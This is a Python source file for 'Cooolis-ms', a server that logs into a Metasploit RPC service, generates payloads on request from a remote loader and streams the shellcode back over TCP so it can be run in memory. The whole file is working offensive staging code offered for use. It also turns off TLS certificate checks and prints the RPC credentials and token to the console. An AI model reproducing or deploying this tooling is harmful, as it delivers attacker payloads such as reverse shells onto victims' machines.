"""
Cooolis-ms
------------
Author:Rvn0xsy@gmail.com
根据Metasploit Framework RPC 实现远程生成PAYLOAD，主要用于给灵活的PE加载器、Shellcode工作
Github:https://github.com/Rvn0xsy/Cooolis-ms/
"""
import requests
from argparse import ArgumentParser
import msgpack
import ssl
import sys
import json
import term
import struct
from socketserver import BaseRequestHandler,ThreadingTCPServer
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context


class Metasploit_RPC(BaseRequestHandler):
    def __init__(self, request, client_address, server, args):
        self.type = args.type
        self.username = args.username
        self.password = args.password
        self.listen = args.listen
        self.host = args.host
        self.port = args.port
        self.server = args.server
        self.uri = args.uri
        self.debug = args.versobe
        self.token = ''
        self.url = ''
        self.headers = {"Content-type" : "binary/message-pack"}
        if args.ssl:
            prefix = 'https://'
        else:
            prefix = 'http://'
        self.url = "{prefix}{host}:{port}{uri}".format(prefix=prefix,host=self.host,port=self.port,uri=self.uri)
        super().__init__(request, client_address, server)

    @classmethod
    def Creator(cls, *args, **kwargs):
        def _HandlerCreator(request, client_address, server):
            cls(request, client_address, server, *args, **kwargs)
        return _HandlerCreator


    def _request(self,options):
        try:
            term.writeLine("[*]API URL : {url} , Method : {method}".format(url=self.url,method=options[0]), term.green)
            options = self.__pack(options)
            req  = requests.post(self.url,verify=False,headers=self.headers,data=options)
            result = self.__unpack(req.content)
            if b'error' in result:
                print("Error : %s" % str(result[b'error_message']),encoding = "utf8")
            else:
                return result
        except Exception as e:
            sys.stderr.write(str(e)+"\nRef:https://metasploit.help.rapid7.com/docs/standard-api-methods-referenc\n")
    

    def _get_token(self):
        options = ["auth.login",self.username,self.password]
        
        result = self._request(options)
        self.token = str(result[b'token'],encoding = "utf8")
        term.writeLine("[*]Token: {token} Username : {username} Password : {password}".format(token=self.token,username=self.username,password=self.password),term.green)
    
    # 打包数据
    def __pack(self,pack_str):
        return msgpack.packb(pack_str)
    
    # 解包数据
    def __unpack(self,pack_str):
        return msgpack.unpackb(pack_str)

    def __send_payload(self,payload,options):
        term.writeLine("[*]PAYLOAD: {payload}".format(payload=payload),term.green)
        pack_data = ["module.execute",self.token,"payload",payload,options]
        return self._request(pack_data)

    def handle(self):
        term.writeLine("[*]New connection: {client}".format(client=self.client_address),term.green)
        self._get_token()
        while True:
            data = self.request.recv(1024)
            if not data:break
            try:
                data = struct.unpack(">200s200s200sLHH",data)
                # print(data)
                options = {}
                str_json = data[1].decode('UTF-8')
                str_json = str_json.strip('\x00')
                # print("Options : %s size : %d",str_json,len(str_json))
                for x in str_json.split(','):
                    k,v = x.split('=',2)
                    # print(k,":",v)
                    options.update({k.strip():v.strip()})
                payload = data[0].decode('UTF-8')
                payload = payload.strip('\x00')
                # print("Payload : %s Options : %s " % (payload,options['LHOST']))
                recv_payload = self.__send_payload(payload,options)
                # print("Send ..  %s ",recv_payload)
                payload_size = len(recv_payload[b'payload'])
                self.request.send(payload_size.to_bytes(4,byteorder='little',signed=False))
                self.request.send(recv_payload[b'payload'])
                self.request.close()
            except Exception as e:
                term.writeLine("[!]{error}".format(error=str(e)),term.red)
                pass
            finally:
                break

def main():
    example = 'Example:\n\n$ python3 server.py -U msf -P msf -v -s -l 4444'
    args = ArgumentParser(prog='Cooolis-ms',epilog=example)
    args.add_argument('-U','--username',help='Metasploit web service username',required=True)
    args.add_argument('-P','--password',help='Metasploit web service password',required=True)
    args.add_argument('-H','--host',help='Metasploit web service host, Default: localhost',default='localhost')
    args.add_argument('-p','--port',help='Metasploit RPC service port, Default: 55553',default=55553,type=int)
    args.add_argument('-S','--server',help='Payload sender listen host, Default: localhost',default='localhost')
    args.add_argument('-l','--listen',help='Payload listen port, Default: 1111',default=1111,type=int)
    args.add_argument('-u','--uri',help='Metasploit RPC service uri, Default: /api/1.0/',default='/api/1.0/')
    args.add_argument('-t','--type',help='Payload Type',choices=('exe','ruby','c','dll','vbs','powershell'))
    args.add_argument('-s','--ssl',help='Enable ssl, Default: True',action="store_true",default=True)
    args.add_argument('-v','--versobe',help='Enable debug',action="store_true")
    parser = args.parse_args()
    term.writeLine("[*]Server Host : {host} , Server Port : {port}".format(host=parser.server,port=parser.listen), term.green)
    server = ThreadingTCPServer((parser.server,parser.listen),Metasploit_RPC.Creator(parser))
    server.serve_forever()
    
if __name__ == "__main__":
    main()
    